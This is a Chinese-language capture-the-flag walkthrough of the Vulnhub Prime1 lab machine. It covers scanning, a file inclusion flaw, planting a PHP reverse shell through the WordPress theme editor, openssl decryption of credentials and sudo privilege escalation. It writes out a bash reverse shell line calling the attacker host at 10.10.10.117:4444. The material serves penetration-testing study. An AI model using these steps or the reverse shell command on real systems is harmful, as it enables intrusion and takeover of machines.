
# 靶机描述

_这是一台启发性渗透的开源靶机。作者描述，在在渗透的过程中，给出了许多提示。这台靶机非常适合给 OSCP 的备考者。_ 

![des](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825162257871.png)


# 信息收集

1. 主机发现
目标 IP 是 10.10.10.143，kali 本地 IP 是 10.10.10.117。

2. 端口扫描

```text
# Nmap 7.99 scan initiated Sun Aug 23 15:41:52 2026 as: /usr/lib/nmap/nmap -sT --min-rate 10000 -p- -oA nmapscan/TCPS 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:85:3F:9E (VMware)

# Nmap done at Sun Aug 23 15:41:55 2026 -- 1 IP address (1 host up) scanned in 2.87 seconds
```

目标开放了 22，80 端口。这是很常见的端口。我们需要进一步查看 UDP 端口扫描的结果信息。

```
# Nmap 7.99 scan initiated Sun Aug 23 15:42:39 2026 as: /usr/lib/nmap/nmap -sU --top-ports 100 -oA nmapscan/UDPS --reason 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up, received arp-response (0.00044s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE  REASON
68/udp   open|filtered dhcpc    no-response
631/udp  open|filtered ipp      no-response
5353/udp open|filtered zeroconf no-response
MAC Address: 00:0C:29:85:3F:9E (VMware)

# Nmap done at Sun Aug 23 15:44:28 2026 -- 1 IP address (1 host up) scanned in 108.96 seconds
```

UDP 扫描的结果来看，没有可利用的端口暴露出来。我们想通过 nmap 脚本的详细信息扫描和版本扫描确认 22， 80 端口运行的版本和详细信息。

```text
# Nmap 7.99 scan initiated Sun Aug 23 15:45:30 2026 as: /usr/lib/nmap/nmap -sT -sV -sC -O -p22,80 -oA nmapscan/details 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.00069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:85:3F:9E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 23 15:45:38 2026 -- 1 IP address (1 host up) scanned in 8.67 seconds
```

可以看到服务器的中间件和版本较低。内核版本比较模糊，在 3.x 和 4.x 之间。我个人认为是 3.x。
那么会不会存在一些已知的漏洞呢？我们马上使用漏洞脚本扫描来验证我们自己的猜想。

4. 漏洞脚本扫描

```text
# Nmap 7.99 scan initiated Sun Aug 23 15:46:11 2026 as: /usr/lib/nmap/nmap --script=vuln -p22,80 -oA nmapscan/vulns 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.00058s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:85:3F:9E (VMware)

# Nmap done at Sun Aug 23 15:51:34 2026 -- 1 IP address (1 host up) scanned in 323.16 seconds
```

漏洞脚本扫描给的信息我们非常感兴趣。目标网站运行这一个 wordpress 站点。


# WEB 渗透

进入 WEB 登录界面后，只发现一张图片。为了获得更多攻击面。

![web1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825164033216.png)

我们进行目标爆破扫描。我们发现有个 dev 的资源路径，令人感兴趣。我们点击后发现，一段话。
他提示我们需要用工具深挖漏洞。

![web2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825164248304.png)

扫描结果中，还有许多我们感兴趣的路径信息。比如这里有一个 secret.txt 我们对里面的内容很感兴趣。

![web3](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825164447827.png)

他说需要我们深挖所有 php 页面的文件。通过 fuzz 方法查看是否有暴露的常见参数名。通过 fuzz 方法可以查出一些网站框架遗忘的接口参数，通过注入恶意 payload 。可能造成 SQL 注入和 越权等操作。

![web4](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825164736590.png)

这里它给了我们一个链接，里面详细给了一个利用 wfuzz 工具的例子。结尾注释中告诉我们，找到正确的参数后，访问 location.txt 文件，我们将会得到下一步操作的提示。

## wfuzz 工具获得信息泄露

我们指定参数，将响应码为 404 的结果隐藏掉。但是依旧暴露了许多结果信息。这里我们的思路是“正确的参数和错误的参数返回的结果肯定不一样。结果一般是错误参数多，我们使用隐藏命令，隐藏一些出现频率高的字段值，那么留下来的，往往就是正确的参数名。”

![wfuzz1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825165959626.png)

所以，这里我隐藏了字段值为 12的结果。我们发现了index.php 界面泄露的 file 参数。

![wfuzz2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825170519798.png)

查看到结果。
![wfuzz3](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825170716650.png)

我们得知了有 secrettier360 这个参数。根据提示，我们找到了 image.php 页面文件。

![wfuzz4](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825184037011.png)

我们猜想有文件本地读取漏洞，给出的结果中，提示我们最终找到了正确的参数。并在 passwd 文件中告诉我们尝试读取 /home/saket/ 目录下的 password.txt 文件。
我们获得了一串字符，不过，此时我相信这是一串凭据。

![wfuzz5](vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825184344109.png)

## wordpress 站点后台登录

经过尝试，我们发现这是 wordpress 后台站点的登录密码。用户是 victor。

![wp1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825184828597.png)

我们接下来的攻击思路是找个功能，能够执行我们的 php 反弹 shell。我们在 appearance 目录栏中，在这个 Twenty Nineteen 主题文件下，发现了一个名为 secret.php 的文件。我们具有编辑权限。

![wp2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825185157882.png)

## 获得立足点

我们使用 kali 的 webshells 文件夹下的 php-reverse-shell.php 木马。通过 WEB 页面触发，获得反弹后 www-data 权限的 shell 连接。

![webshell1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825185755143.png)

![webshell2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825185835196.png)

# 权限提升

获得连接。
![p1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825215309386.png)

首先使用命令查看当前用户已有的权限。
```shell
sudo -l
```

![p2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825215923703.png)

通过 Google 搜索引擎，发现 enc 是 openssl 的一个功能。而 enc 的含义是对称密文例程。用来对称加密解密文件的工具。

![p3](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825220025644.png)

![p4](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825220202659.png)

一般管理员会定期的备份文件，有时候很有可能会备份登录凭据到备份文件中。我们通过 find 工具搜索。发现泄露的 www-data 的密码。

![p5](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825220459499.png)

获得凭据信息。

![p6](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825220558117.png)

运行 enc 程序。发现我们 saket 家目录下，多了几个文件。

![p7](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825220756739.png)

有个 enc.txt 的文件就是要解密的密文。根据 openssl 文档和 key.txt 里面的提示，"ippsec" 的 md5 格式就是我们所需要的 key。

## md5 格式指定

通过查看 openssl 的帮助手册，发现指定的 key 要求是十六进制格式。
我们使用 od 工具，将 MD5 值转换成 十六进制格式。

![md51](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825221252974.png)

![md52](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825221315286.png)

最后使用命令 tr 去掉换行符和空格。我们获得了最终十六进制格式。
![md53](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825221506821.png)

## openssl 循环猜解密文类型

```shell
for ChiperType in $(cat ChiperRawTest);do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -a -d -$ChiperType -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;print $ChiperType;done

```

![open1](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825221712597.png)

我们得到了密文类型是 aes-256-ecb，并且获得了密文的明文信息。

```shell
echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -a -d -aes-256-ecb -K 3336366137346362336339353964653137643631646233303539316333396431
```

![open2](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825222049578.png)

我们成功获得了 saket 的 ssh 凭据。

![open3](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825222135833.png)

同样使用 

```shell
sudo -l
```

命令查看当前用户拥有的权限。

![open4](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825222248680.png)

猜测是 /tmp/challenge 文件能够被以管理员权限进行运行。
/tmp/challenge 

```shell
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.10.117/4444 0>&1
```


![open5](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825222438347.png)

我们成功获得 root 权限。
查看我们的获利品。

![root](../vulnhubScreenShot/Vulnhub%20Prime1%20靶机渗透总结/IMG-20260825222731089.png)

# 总结

通过端口扫描，我们发现目标开放了 22，80 端口。经过有意的指引，我们成功活动 wordpress 后台登录凭据并且获得立足点 webshell。这个靶机最有价值的是关于 openssl 的学习和利用。基于稳定性考量，我们不选取内核漏洞利用作为我们的提权方式。我们先是发现 www-data 用户具有免密执行 enc 文件的权限。但是我们没有 www-data 用户的密码。我们想到网站管理员需要定时备份文件。这很有可能导致凭据泄露。通过 find 命令查找备份文件，我成功找到 www-data 用户的密码。执行 enc 文件发现给了一串密文和 key。我们需要使用 openssl 工具来解密这串密文。由于不知道密文类型，我们只能使用 for 循环来逐个尝试。
通过查看解密后明文文本，我们发现 saket 的老凭据。我们成功登录。发现 undefeated_victor 可以免密以高权限执行我们恶意指令。最终我们获得了靶机的 root 权限。
